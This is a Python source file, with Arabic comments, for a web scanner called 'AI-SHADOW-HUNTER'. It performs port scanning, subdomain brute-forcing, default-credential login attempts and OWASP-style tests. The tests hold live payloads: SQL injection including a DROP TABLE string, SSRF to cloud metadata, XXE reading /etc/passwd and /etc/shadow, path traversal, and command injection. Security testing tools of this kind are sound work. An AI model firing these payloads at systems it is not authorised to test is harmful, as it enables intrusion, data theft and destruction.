# -*- coding: utf-8 -*-
"""
AI-SHADOW-HUNTER v7.0 - Advanced OWASP Top 10 Scanner
Enhanced parameter discovery and exploitation
يكتشف الـ parameters بنفسه ويختبرها بشكل ذكي
"""

import asyncio
import aiohttp
import urllib.parse
import socket
import json
import random
import ssl as ssl_std
import requests
import re
import argparse
import logging
import sys
import os
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional, List, Dict, Tuple, Set
from collections import defaultdict

# Import config
try:
    import config
except ImportError:
    print("⚠️ تحذير: لم يتم العثور على config.py")
    config = None

# Optional libs
try:
    import whois as pywhois
    WHOIS_AVAILABLE = True
except Exception:
    WHOIS_AVAILABLE = False

try:
    from cryptography import x509
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except Exception:
    CRYPTO_AVAILABLE = False

try:
    from waybackpy import WaybackMachineCDXServerAPI
    WAYBACK_AVAILABLE = True
except Exception:
    WAYBACK_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except Exception:
    BS4_AVAILABLE = False

try:
    from reportlab.lib.pagesizes import A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib import colors
    REPORTLAB_AVAILABLE = True
except Exception:
    REPORTLAB_AVAILABLE = False

try:
    import numpy as np
    from sklearn.ensemble import IsolationForest
    SKLEARN_AVAILABLE = True
except Exception:
    SKLEARN_AVAILABLE = False

# ----------------------------
# Logger setup
# ----------------------------
logger = logging.getLogger("AIShadowHunterV7")
logger.setLevel(logging.INFO)
handler = logging.StreamHandler(sys.stdout)
handler.setFormatter(logging.Formatter("%(asctime)s - %(levelname)s - %(message)s"))
logger.addHandler(handler)

# ----------------------------
# Utility helpers
# ----------------------------
def timestamp_str() -> str:
    return datetime.now().strftime("%Y%m%d_%H%M%S")

def clean_domain(input_url: str) -> str:
    p = urllib.parse.urlparse(input_url if input_url.startswith("http") else "http://" + input_url)
    return p.hostname or p.netloc

def ensure_scheme(url: str) -> str:
    return url if url.startswith("http") else "http://" + url

def ensure_output_dir(path: str):
    os.makedirs(path, exist_ok=True)
    return path

# ----------------------------
# PARAMETER DISCOVERY & ANALYSIS
# ----------------------------
class ParameterDiscovery:
    """
    اكتشاف الـ parameters من الـ URLs تلقائياً
    يفحص الـ query strings والـ forms والـ APIs
    """
    
    def __init__(self, timeout: int = 10, max_workers: int = 20):
        self.timeout = timeout
        self.max_workers = max_workers
        self.discovered_params: Dict[str, Set[str]] = defaultdict(set)
        self.urls_with_params: List[str] = []

    def extract_params_from_url(self, url: str) -> Dict[str, List[str]]:
        """استخراج الـ parameters من URL"""
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        return query_params

    def extract_params_from_html(self, html: str, base_url: str) -> List[str]:
        """استخراج الـ parameters من forms و links في الـ HTML"""
        params = set()
        
        # البحث عن form inputs
        form_pattern = r'<input[^>]+name=["\']?([^"\'\s>]+)'
        for match in re.finditer(form_pattern, html, re.IGNORECASE):
            params.add(match.group(1))
        
        # البحث عن URLs في الـ href
        href_pattern = r'href=["\']([^"\']+)'
        for match in re.finditer(href_pattern, html, re.IGNORECASE):
            url = match.group(1)
            if url.startswith('?') or '?' in url:
                extracted = self.extract_params_from_url(base_url + url)
                params.update(extracted.keys())
        
        # البحث عن AJAX endpoints
        ajax_pattern = r'(?:url|endpoint|api)[\s:]*["\']([^"\']+)'
        for match in re.finditer(ajax_pattern, html, re.IGNORECASE):
            url = match.group(1)
            extracted = self.extract_params_from_url(url)
            params.update(extracted.keys())
        
        return list(params)

    def discover_parameters(self, target_url: str) -> Dict[str, List[str]]:
        """اكتشاف جميع الـ parameters من الـ target"""
        logger.info(f"🔎 اكتشاف الـ parameters من {target_url}")
        
        all_params = defaultdict(list)
        
        # 1. استخراج من الـ URL الأساسي
        try:
            resp = requests.get(target_url, timeout=self.timeout)
            
            # من الـ query string
            query_params = self.extract_params_from_url(target_url)
            for param, values in query_params.items():
                all_params[param].extend(values)
                self.discovered_params['query'].add(param)
            
            # من الـ HTML
            if resp.status_code == 200:
                html_params = self.extract_params_from_html(resp.text, target_url)
                for param in html_params:
                    all_params[param].append("discovered_from_html")
                    self.discovered_params['html'].add(param)
        
        except Exception as e:
            logger.debug(f"خطأ في اكتشاف الـ parameters: {e}")
        
        logger.info(f"✅ تم اكتشاف {len(all_params)} parameter: {list(all_params.keys())}")
        return dict(all_params)

# ----------------------------
# ADVANCED OWASP TOP 10 TESTER (محسّن)
# ----------------------------
class AdvancedOWASPTester:
    """
    فاحص OWASP Top 10 محسّن مع:
    - اكتشاف تلقائي للـ parameters
    - اختبارات حقيقية وفعّالة
    - payloads موسّعة ومحدّثة
    - نتائج واضحة ومفصّلة
    """
    
    def __init__(self, request_delay: float = 0.5, aggressive: bool = False, time_based_threshold: float = 2.0):
        self.findings = {}
        self.severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
        self.request_delay = request_delay
        self.aggressive = aggressive
        self.time_based_threshold = time_based_threshold
        self.vulnerability_details = []
        
        # استخدام config إذا كان موجود
        if config:
            self.sqli_payloads = config.SQLI_PAYLOADS
            self.sqli_indicators = config.SQLI_INDICATORS
            self.ssrf_payloads = config.SSRF_PAYLOADS
            self.default_creds = config.DEFAULT_CREDENTIALS
            self.sensitive_paths = config.SENSITIVE_PATHS
            self.protected_paths = config.PROTECTED_PATHS
        else:
            # قيم افتراضية
            self.sqli_payloads = [
                "1' OR '1'='1",
                "1' UNION SELECT NULL--",
                "1'; DROP TABLE users--",
                "1' AND SLEEP(5)--",
                "admin' --",
            ]
            self.sqli_indicators = [
                "sql syntax", "mysql_fetch", "ORA-", "PostgreSQL", "sqlserver",
                "database error", "mysql_error", "SQL error"
            ]
            self.ssrf_payloads = [
                "http://127.0.0.1",
                "http://localhost",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
            ]
            self.default_creds = [
                ("admin", "admin"),
                ("admin", "password"),
                ("test", "test"),
            ]
            self.sensitive_paths = ["/.env", "/config.php", "/web.config"]
            self.protected_paths = ["/admin", "/admin/login", "/api/admin"]

    async def _safe_get(self, session, url, headers, params=None):
        """طلب آمن مع معالجة الأخطاء"""
        try:
            async with session.get(url, headers=headers, params=params, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                try:
                    text = await resp.text()
                except Exception:
                    data = await resp.read()
                    text = data.decode('utf-8', errors='replace')
                return resp.status, text, dict(resp.headers)
        except Exception as e:
            logger.debug(f"GET error: {e}")
            return None, "", {}

    async def _safe_post(self, session, url, headers, data=None):
        """طلب POST آمن"""
        try:
            async with session.post(url, headers=headers, data=data, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                try:
                    text = await resp.text()
                except Exception:
                    text = (await resp.read()).decode('utf-8', errors='replace')
                return resp.status, text, dict(resp.headers)
        except Exception as e:
            logger.debug(f"POST error: {e}")
            return None, "", {}

    # ==================== A01: SQL Injection ====================
    async def test_sql_injection(self, session, url, headers, discovered_params):
        """اختبار SQL Injection في جميع الـ parameters"""
        logger.info("🔍 اختبار A01: SQL Injection")
        findings = []
        
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        for param in discovered_params.keys():
            logger.info(f"  📌 اختبار parameter: {param}")
            
            # اختبار Error-based SQLi
            for payload in self.sqli_payloads:
                test_params = query_params.copy()
                test_params[param] = [payload]
                
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(test_params, doseq=True)
                ).geturl()
                
                status, text, headers_resp = await self._safe_get(session, test_url, headers)
                
                # البحث عن مؤشرات SQL Injection
                for indicator in self.sqli_indicators:
                    if indicator.lower() in (text or "").lower():
                        finding = {
                            "type": "SQL Injection (Error-based)",
                            "parameter": param,
                            "payload": payload,
                            "indicator": indicator,
                            "severity": "CRITICAL",
                            "url": test_url,
                            "response_preview": text[:200]
                        }
                        findings.append(finding)
                        self.vulnerability_details.append(finding)
                        self.severity_counts["CRITICAL"] += 1
                        logger.warning(f"    ⚠️ SQL Injection found: {param}")
                        break
                
                await asyncio.sleep(self.request_delay)
            
            # اختبار Time-based Blind SQLi
            time_payloads = [
                "1' AND SLEEP(5)--",
                "1' AND BENCHMARK(5000000,MD5('a'))--",
                "1' AND WAITFOR DELAY '00:00:05'--"
            ]
            
            for payload in time_payloads:
                test_params = query_params.copy()
                test_params[param] = [payload]
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(test_params, doseq=True)
                ).geturl()
                
                start = asyncio.get_event_loop().time()
                status, text, _ = await self._safe_get(session, test_url, headers)
                elapsed = asyncio.get_event_loop().time() - start
                
                if elapsed > self.time_based_threshold:
                    finding = {
                        "type": "SQL Injection (Time-based Blind)",
                        "parameter": param,
                        "payload": payload,
                        "response_time": elapsed,
                        "severity": "CRITICAL",
                        "url": test_url
                    }
                    findings.append(finding)
                    self.vulnerability_details.append(finding)
                    self.severity_counts["CRITICAL"] += 1
                    logger.warning(f"    ⚠️ Time-based SQLi found: {param}")
                    break
                
                await asyncio.sleep(self.request_delay)
        
        self.findings["A01:2021 - SQL Injection"] = findings
        return findings

    # ==================== A02: Broken Authentication ====================
    async def test_broken_auth(self, session, base_url, headers):
        """اختبار الـ Broken Authentication"""
        logger.info("🔍 اختبار A02: Broken Authentication")
        findings = []
        
        if not self.aggressive:
            logger.info("  ⏭️ تم تخطي الاختبار (غير في aggressive mode)")
            self.findings["A02:2021 - Broken Authentication"] = findings
            return findings
        
        # اختبار المسارات الشهيرة
        auth_paths = ["/login", "/admin/login", "/api/auth/login", "/user/login"]
        
        for path in auth_paths:
            test_url = base_url.rstrip('/') + path
            
            for username, password in self.default_creds:
                data = {
                    "username": username,
                    "password": password,
                    "login": "Login"
                }
                
                status, text, _ = await self._safe_post(session, test_url, headers, data)
                
                # علامات النجاح المحتملة
                fail_indicators = ["invalid", "wrong", "failed", "incorrect", "error", "forbidden"]
                
                if status == 200 and all(ind not in text.lower() for ind in fail_indicators):
                    finding = {
                        "type": "Weak Credentials",
                        "path": path,
                        "credentials": f"{username}:{password}",
                        "severity": "CRITICAL",
                        "url": test_url
                    }
                    findings.append(finding)
                    self.vulnerability_details.append(finding)
                    self.severity_counts["CRITICAL"] += 1
                    logger.warning(f"    ⚠️ Weak credentials found: {username}:{password}")
                
                await asyncio.sleep(self.request_delay)
        
        self.findings["A02:2021 - Broken Authentication"] = findings
        return findings

    # ==================== A03: Sensitive Data Exposure ====================
    async def test_sensitive_data(self, session, base_url, headers):
        """اختبار تسريب البيانات الحساسة"""
        logger.info("🔍 اختبار A03: Sensitive Data Exposure")
        findings = []
        
        sensitive_files = [
            "/.env", "/config.php", "/web.config", "/.git/config",
            "/database.yml", "/secrets.json", "/.env.backup",
            "/config.json", "/settings.json", "/.env.local"
        ]
        
        for file_path in sensitive_files:
            test_url = base_url.rstrip('/') + file_path
            
            status, text, _ = await self._safe_get(session, test_url, headers)
            await asyncio.sleep(self.request_delay)
            
            if status == 200:
                finding = {
                    "type": "Exposed Sensitive File",
                    "file": file_path,
                    "status": status,
                    "severity": "CRITICAL",
                    "url": test_url,
                    "preview": text[:300]
                }
                findings.append(finding)
                self.vulnerability_details.append(finding)
                self.severity_counts["CRITICAL"] += 1
                logger.warning(f"    ⚠️ Sensitive file exposed: {file_path}")
            
            elif status in [301, 302]:
                finding = {
                    "type": "Sensitive File (Redirected)",
                    "file": file_path,
                    "status": status,
                    "severity": "HIGH",
                    "url": test_url
                }
                findings.append(finding)
                self.severity_counts["HIGH"] += 1
        
        self.findings["A03:2021 - Sensitive Data Exposure"] = findings
        return findings

    # ==================== A04: XXE Injection ====================
    async def test_xxe_injection(self, session, url, headers):
        """اختبار XXE Injection"""
        logger.info("🔍 اختبار A04: XXE Injection")
        findings = []
        
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
        ]
        
        for payload in xxe_payloads:
            try:
                status, text, _ = await self._safe_post(session, url, headers, data=payload)
                
                if "root:" in text or "passwd" in text or status == 200:
                    finding = {
                        "type": "XXE Injection",
                        "severity": "CRITICAL",
                        "url": url,
                        "payload": payload[:100],
                        "response": text[:200]
                    }
                    findings.append(finding)
                    self.vulnerability_details.append(finding)
                    self.severity_counts["CRITICAL"] += 1
                    logger.warning(f"    ⚠️ XXE Injection found")
            except:
                pass
            
            await asyncio.sleep(self.request_delay)
        
        self.findings["A04:2021 - XXE Injection"] = findings
        return findings

    # ==================== A05: SSRF ====================
    async def test_ssrf(self, session, url, headers, discovered_params):
        """اختبار Server-Side Request Forgery"""
        logger.info("🔍 اختبار A05: SSRF")
        findings = []
        
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        for param in discovered_params.keys():
            logger.info(f"  📌 اختبار SSRF في: {param}")
            
            for payload in self.ssrf_payloads:
                test_params = query_params.copy()
                test_params[param] = [payload]
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(test_params, doseq=True)
                ).geturl()
                
                status, text, _ = await self._safe_get(session, test_url, headers)
                
                # علامات SSRF الناجحة
                ssrf_indicators = ["root:", "passwd", "metadata", "ec2", "169.254"]
                
                for indicator in ssrf_indicators:
                    if indicator in text:
                        finding = {
                            "type": "Server-Side Request Forgery (SSRF)",
                            "parameter": param,
                            "payload": payload,
                            "severity": "CRITICAL",
                            "url": test_url,
                            "indicator": indicator,
                            "response": text[:300]
                        }
                        findings.append(finding)
                        self.vulnerability_details.append(finding)
                        self.severity_counts["CRITICAL"] += 1
                        logger.warning(f"    ⚠️ SSRF found: {param}")
                        break
                
                await asyncio.sleep(self.request_delay)
        
        self.findings["A05:2021 - SSRF"] = findings
        return findings

    # ==================== A06: Path Traversal ====================
    async def test_path_traversal(self, session, url, headers, discovered_params):
        """اختبار Path Traversal"""
        logger.info("🔍 اختبار A06: Path Traversal")
        findings = []
        
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "file:///etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]
        
        for param in discovered_params.keys():
            for payload in traversal_payloads:
                test_params = query_params.copy()
                test_params[param] = [payload]
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(test_params, doseq=True)
                ).geturl()
                
                status, text, _ = await self._safe_get(session, test_url, headers)
                
                if "root:" in text or "win.ini" in text:
                    finding = {
                        "type": "Path Traversal",
                        "parameter": param,
                        "payload": payload,
                        "severity": "HIGH",
                        "url": test_url,
                        "response": text[:200]
                    }
                    findings.append(finding)
                    self.vulnerability_details.append(finding)
                    self.severity_counts["HIGH"] += 1
                    logger.warning(f"    ⚠️ Path Traversal found: {param}")
                
                await asyncio.sleep(self.request_delay)
        
        self.findings["A06:2021 - Path Traversal"] = findings
        return findings

    # ==================== A07: Command Injection ====================
    async def test_command_injection(self, session, url, headers, discovered_params):
        """اختبار Command Injection"""
        logger.info("🔍 اختبار A07: Command Injection")
        findings = []
        
        command_payloads = [
            "; ls -la",
            "| whoami",
            "& dir",
            "`id`",
            "$(whoami)",
            "; cat /etc/passwd",
        ]
        
        for param in discovered_params.keys():
            for payload in command_payloads:
                test_params = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
                test_params[param] = [payload]
                test_url = urllib.parse.urlparse(url)._replace(
                    query=urllib.parse.urlencode(test_params, doseq=True)
                ).geturl()
                
                status, text, _ = await self._safe_get(session, test_url, headers)
                
                if "uid=" in text or "root" in text or "bin" in text:
                    finding = {
                        "type": "Command Injection",
                        "parameter": param,
                        "payload": payload,
                        "severity": "CRITICAL",
                        "url": test_url,
                        "response": text[:200]
                    }
                    findings.append(finding)
                    self.vulnerability_details.append(finding)
                    self.severity_counts["CRITICAL"] += 1
                    logger.warning(f"    ⚠️ Command Injection found: {param}")
                
                await asyncio.sleep(self.request_delay)
        
        self.findings["A07:2021 - Command Injection"] = findings
        return findings

    # ==================== A08: Security Misconfiguration ====================
    async def test_security_misconfiguration(self, session, base_url, headers):
        """اختبار Security Misconfiguration"""
        logger.info("🔍 اختبار A08: Security Misconfiguration")
        findings = []
        
        # فحص HTTPS
        if base_url.startswith("http://"):
            finding = {
                "type": "Unencrypted Communication",
                "severity": "HIGH",
                "description": "الموقع يستخدم HTTP بدلاً من HTTPS"
            }
            findings.append(finding)
            self.severity_counts["HIGH"] += 1
        
        # فحص Security Headers
        status, text, resp_headers = await self._safe_get(session, base_url, headers)
        
        required_headers = ["Strict-Transport-Security", "X-Content-Type-Options", "X-Frame-Options"]
        for header in required_headers:
            if header.lower() not in [h.lower() for h in resp_headers.keys()]:
                finding = {
                    "type": "Missing Security Header",
                    "header": header,
                    "severity": "MEDIUM",
                    "description": f"الـ header {header} غير موجود"
                }
                findings.append(finding)
                self.severity_counts["MEDIUM"] += 1
        
        self.findings["A08:2021 - Security Misconfiguration"] = findings
        return findings

    # ==================== A09: Broken Access Control ====================
    async def test_broken_access_control(self, session, base_url, headers):
        """اختبار Broken Access Control"""
        logger.info("🔍 اختبار A09: Broken Access Control")
        findings = []
        
        protected_paths = ["/admin", "/admin/dashboard", "/user/profile", "/api/admin"]
        
        for path in protected_paths:
            test_url = base_url.rstrip('/') + path
            status, text, _ = await self._safe_get(session, test_url, headers)
            
            if status == 200:
                finding = {
                    "type": "Broken Access Control",
                    "path": path,
                    "status": status,
                    "severity": "HIGH",
                    "url": test_url,
                    "description": f"يمكن الوصول لمسار محمي: {path}"
                }
                findings.append(finding)
                self.vulnerability_details.append(finding)
                self.severity_counts["HIGH"] += 1
                logger.warning(f"    ⚠️ Access Control bypass: {path}")
            
            await asyncio.sleep(self.request_delay)
        
        self.findings["A09:2021 - Broken Access Control"] = findings
        return findings

    # ==================== A10: Using Components with Known Vulnerabilities ====================
    async def test_known_vulnerabilities(self, session, base_url, headers):
        """اختبار المكونات المعروفة بثغراتها"""
        logger.info("🔍 اختبار A10: Known Vulnerabilities")
        findings = []
        
        status, text, resp_headers = await self._safe_get(session, base_url, headers)
        
        # البحث عن مؤشرات مكونات قديمة
        vulnerable_patterns = {
            r"jQuery\s*[0-3]\.": {"name": "jQuery < 4", "severity": "MEDIUM"},
            r"Bootstrap\s*[0-2]\.": {"name": "Bootstrap < 3", "severity": "MEDIUM"},
            r"WordPress\s*[0-4]\.": {"name": "WordPress < 5", "severity": "HIGH"},
            r"Apache\s*2\.[0-2]": {"name": "Apache < 2.4", "severity": "HIGH"},
        }
        
        for pattern, info in vulnerable_patterns.items():
            if re.search(pattern, text or "", re.IGNORECASE):
                finding = {
                    "type": "Known Vulnerability",
                    "component": info["name"],
                    "severity": info["severity"],
                    "description": f"اكتشف {info['name']} وهو معروف بثغرات أمنية"
                }
                findings.append(finding)
                self.vulnerability_details.append(finding)
                self.severity_counts[info["severity"]] += 1
                logger.warning(f"    ⚠️ Known vulnerability: {info['name']}")
        
        self.findings["A10:2021 - Known Vulnerabilities"] = findings
        return findings

    async def run_all_tests(self, session, base_url, url, headers, discovered_params):
        """تشغيل جميع الاختبارات"""
        logger.info("🔍 بدء اختبارات OWASP Top 10 الشاملة")
        
        await self.test_sql_injection(session, url, headers, discovered_params)
        await self.test_broken_auth(session, base_url, headers)
        await self.test_sensitive_data(session, base_url, headers)
        await self.test_xxe_injection(session, url, headers)
        await self.test_ssrf(session, url, headers, discovered_params)
        await self.test_path_traversal(session, url, headers, discovered_params)
        await self.test_command_injection(session, url, headers, discovered_params)
        await self.test_security_misconfiguration(session, base_url, headers)
        await self.test_broken_access_control(session, base_url, headers)
        await self.test_known_vulnerabilities(session, base_url, headers)
        
        return self.findings

    def get_summary(self) -> Dict:
        """ملخص النتائج"""
        return {
            "severity_counts": self.severity_counts,
            "total_vulnerabilities": len(self.vulnerability_details),
            "vulnerabilities": self.vulnerability_details
        }

# ----------------------------
# SUBDOMAIN ENUMERATION
# ----------------------------
class SubdomainEnumerator:
    """كشف الـ subdomains"""
    
    def __init__(self, domain: str, timeout: int = 5, max_workers: int = 20):
        self.domain = domain
        self.timeout = timeout
        self.max_workers = max_workers
        self.found_subdomains: Set[str] = set()
        
        if config:
            self.common_subdomains = config.COMMON_SUBDOMAINS
        else:
            self.common_subdomains = ["www", "api", "admin", "mail", "ftp"]

    def resolve_subdomain(self, subdomain: str) -> Optional[str]:
        """حل DNS للـ subdomain"""
        try:
            full_domain = f"{subdomain}.{self.domain}"
            ip = socket.gethostbyname(full_domain)
            return ip
        except socket.gaierror:
            return None
        except Exception as e:
            logger.debug(f"DNS error: {e}")
            return None

    def brute_force_subdomains(self) -> Dict[str, str]:
        """Brute force الـ subdomains"""
        logger.info(f"🔍 كشف الـ subdomains للـ {self.domain}")
        results = {}
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {
                executor.submit(self.resolve_subdomain, sub): sub 
                for sub in self.common_subdomains
            }
            
            for future in as_completed(futures):
                subdomain = futures[future]
                try:
                    ip = future.result()
                    if ip:
                        full_domain = f"{subdomain}.{self.domain}"
                        results[full_domain] = ip
                        self.found_subdomains.add(full_domain)
                        logger.info(f"  ✓ وجدت: {full_domain} -> {ip}")
                except Exception as e:
                    logger.debug(f"Error: {e}")
        
        logger.info(f"✅ وجدت {len(results)} subdomains")
        return results

# ----------------------------
# PORT SCANNER
# ----------------------------
class AdvancedPortScanner:
    """فاحص المنافذ"""
    
    def __init__(self, target_ip, common_ports=None):
        self.target_ip = target_ip
        self.open_ports = []
        
        if config:
            self.port_services = config.PORT_SERVICES
            self.ports_to_scan = config.PORT_SCAN_COMMON_PORTS
        else:
            self.port_services = {80: "HTTP", 443: "HTTPS", 22: "SSH"}
            self.ports_to_scan = [80, 443, 22, 21, 25, 53]

    def scan_port(self, port, timeout=0.5):
        """فحص منفذ واحد"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((self.target_ip, port))
            sock.close()
            if result == 0:
                service = self.port_services.get(port, "Unknown")
                return port, True, service
            return port, False, None
        except Exception as e:
            logger.debug(f"Port scan error: {e}")
            return port, False, None

    def scan_all_ports_parallel(self, max_workers=20):
        """فحص جميع المنافذ بالتوازي"""
        logger.info(f"📡 فحص المنافذ على {self.target_ip}")
        self.open_ports = []
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.scan_port, port): port for port in self.ports_to_scan}
            for future in as_completed(futures):
                try:
                    port, is_open, service = future.result()
                    if is_open:
                        self.open_ports.append((port, service))
                        logger.info(f"  ✓ منفذ مفتوح: {port} - {service}")
                except Exception as e:
                    logger.debug(f"Error: {e}")
        
        return self.open_ports

# ----------------------------
# REPORT GENERATOR (محسّن)
# ----------------------------
class FinalReportGenerator:
    """مولد التقارير النهائية"""
    
    @staticmethod
    def save_json_report(filename: str, data: Dict):
        """حفظ تقرير JSON"""
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
            logger.info(f"✅ تم حفظ التقرير: {filename}")
        except Exception as e:
            logger.error(f"خطأ في حفظ التقرير: {e}")

    @staticmethod
    def generate_html_report(filename: str, data: Dict):
        """إنشاء تقرير HTML"""
        html_content = f"""
<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>AI-SHADOW-HUNTER Report</title>
    <style>
        body {{ font-family: 'Segoe UI', Tahoma, Geneva; background: #f5f5f5; margin: 0; padding: 20px; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; }}
        .header {{ text-align: center; border-bottom: 3px solid #d32f2f; padding-bottom: 20px; }}
        h1 {{ color: #1a237e; margin: 0; }}
        .summary {{ display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin: 30px 0; }}
        .severity-box {{ padding: 20px; border-radius: 8px; text-align: center; color: white; font-weight: bold; }}
        .critical {{ background: #d32f2f; }}
        .high {{ background: #f57c00; }}
        .medium {{ background: #fbc02d; color: black; }}
        .low {{ background: #388e3c; }}
        .vulnerability {{ margin: 20px 0; padding: 15px; background: #f9f9f9; border-left: 4px solid #d32f2f; }}
        .vuln-title {{ font-weight: bold; color: #1a237e; }}
        .vuln-details {{ margin-top: 10px; font-size: 0.9em; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔍 AI-SHADOW-HUNTER Security Scan Report</h1>
            <p>Target: {data.get('target', 'Unknown')}</p>
            <p>Date: {data.get('timestamp', 'Unknown')}</p>
        </div>
        
        <div class="summary">
            <div class="severity-box critical">
                <div>CRITICAL</div>
                <div style="font-size: 2em;">{data.get('severity_counts', {}).get('CRITICAL', 0)}</div>
            </div>
            <div class="severity-box high">
                <div>HIGH</div>
                <div style="font-size: 2em;">{data.get('severity_counts', {}).get('HIGH', 0)}</div>
            </div>
            <div class="severity-box medium">
                <div>MEDIUM</div>
                <div style="font-size: 2em;">{data.get('severity_counts', {}).get('MEDIUM', 0)}</div>
            </div>
            <div class="severity-box low">
                <div>LOW</div>
                <div style="font-size: 2em;">{data.get('severity_counts', {}).get('LOW', 0)}</div>
            </div>
        </div>
        
        <h2>Vulnerabilities Found</h2>
        {''.join([f'<div class="vulnerability"><div class="vuln-title">{v.get("type", "Unknown")}</div><div class="vuln-details"><strong>Severity:</strong> {v.get("severity", "Unknown")}<br><strong>Details:</strong> {v.get("description", v.get("parameter", "N/A"))}</div></div>' for v in data.get('vulnerabilities', [])])}
    </div>
</body>
</html>
        """
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(html_content)
            logger.info(f"✅ تم إنشاء تقرير HTML: {filename}")
        except Exception as e:
            logger.error(f"خطأ: {e}")

# ----------------------------
# MAIN SCANNER
# ----------------------------
class AIShadowHunterV7:
    """الفاحص الرئيسي النسخة 7"""
    
    def __init__(self, target_url: str, output_dir: str = "results", aggressive: bool = False, max_workers: int = 20):
        self.target_url = ensure_scheme(target_url)
        self.domain = clean_domain(self.target_url)
        self.output_dir = ensure_output_dir(output_dir)
        self.aggressive = aggressive
        self.max_workers = max_workers
        self.target_ip = "Unknown"
        
        self.param_discovery = ParameterDiscovery(max_workers=max_workers)
        self.owasp_tester = AdvancedOWASPTester(aggressive=aggressive)
        self.port_scanner = None
        self.subdomain_enumerator = SubdomainEnumerator(self.domain, max_workers=max_workers)
        
        self.results = {
            "target": self.target_url,
            "domain": self.domain,
            "timestamp": timestamp_str(),
            "severity_counts": {},
            "vulnerabilities": []
        }

    def resolve_ip(self):
        """حل DNS"""
        try:
            self.target_ip = socket.gethostbyname(self.domain)
            logger.info(f"✅ تم حل IP: {self.target_ip}")
        except Exception as e:
            logger.warning(f"⚠️ فشل حل DNS: {e}")
            self.target_ip = "Unknown"

    def run_port_scan(self):
        """فحص المنافذ"""
        if self.target_ip == "Unknown":
            logger.warning("⚠️ لم يتمكن من فحص المنافذ (IP مجهول)")
            return []
        
        self.port_scanner = AdvancedPortScanner(self.target_ip)
        return self.port_scanner.scan_all_ports_parallel(max_workers=self.max_workers)

    def discover_parameters(self):
        """اكتشاف الـ parameters"""
        return self.param_discovery.discover_parameters(self.target_url)

    async def run_owasp_tests(self, discovered_params):
        """تشغيل اختبارات OWASP"""
        logger.info("🛡️ تشغيل اختبارات OWASP Top 10")
        
        timeout_obj = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout_obj) as session:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            
            findings = await self.owasp_tester.run_all_tests(
                session, 
                self.target_url, 
                self.target_url, 
                headers,
                discovered_params
            )
        
        return findings

    def run_scan(self):
        """تشغيل الفحص الكامل"""
        logger.info("\n" + "="*60)
        logger.info("🚀 بدء الفحص الأمني الشامل")
        logger.info("="*60 + "\n")
        
        # 1. حل DNS
        self.resolve_ip()
        
        # 2. فحص المنافذ
        logger.info("\n📡 المرحلة 1: فحص المنافذ")
        open_ports = self.run_port_scan()
        self.results["open_ports"] = open_ports
        
        # 3. اكتشاف الـ parameters
        logger.info("\n🔎 المرحلة 2: اكتشاف الـ parameters")
        discovered_params = self.discover_parameters()
        self.results["discovered_parameters"] = discovered_params
        
        # 4. اختبارات OWASP
        logger.info("\n🛡️ المرحلة 3: اختبارات OWASP Top 10")
        loop = asyncio.new_event_loop()
        try:
            asyncio.set_event_loop(loop)
            owasp_findings = loop.run_until_complete(self.run_owasp_tests(discovered_params))
        finally:
            loop.close()
        
        self.results["owasp_findings"] = owasp_findings
        self.results["severity_counts"] = self.owasp_tester.severity_counts
        self.results["vulnerabilities"] = self.owasp_tester.vulnerability_details
        
        # 5. حفظ التقارير
        logger.info("\n📊 المرحلة 4: إنشاء التقارير")
        self.save_reports()
        
        logger.info("\n" + "="*60)
        logger.info("✅ اكتمل ��لفحص بنجاح!")
        logger.info("="*60 + "\n")
        
        return self.results

    def save_reports(self):
        """حفظ التقارير"""
        ts = timestamp_str()
        
        # JSON Report
        json_file = os.path.join(self.output_dir, f"report_{ts}.json")
        FinalReportGenerator.save_json_report(json_file, self.results)
        
        # HTML Report
        html_file = os.path.join(self.output_dir, f"report_{ts}.html")
